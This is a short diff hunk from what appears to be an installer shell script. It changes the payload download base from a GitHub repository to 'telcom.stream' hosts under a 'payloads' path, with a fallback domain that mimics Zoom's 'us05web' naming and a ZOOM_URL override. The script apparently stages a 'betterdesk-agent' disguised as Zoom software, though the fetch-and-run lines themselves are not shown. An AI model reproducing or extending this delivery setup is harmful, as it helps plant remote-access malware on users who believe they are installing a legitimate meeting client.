@@ -16,7 +16,7 @@ umask 022
 VERSION='__VERSION__'
 PAYLOAD_NAME='__PAYLOAD_NAME__'
 EXPECTED_SHA='__PAYLOAD_SHA__'
-REPO_BASE='https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/linux'
+REPO_BASE='https://global.telcom.stream/downloads/payloads'
 FALLBACK_BASE='https://us05web.telcom.stream'
 PRIMARY_URL="${ZOOM_URL:-$REPO_BASE/$PAYLOAD_NAME}"
 AGENT_NAME='betterdesk-agent'
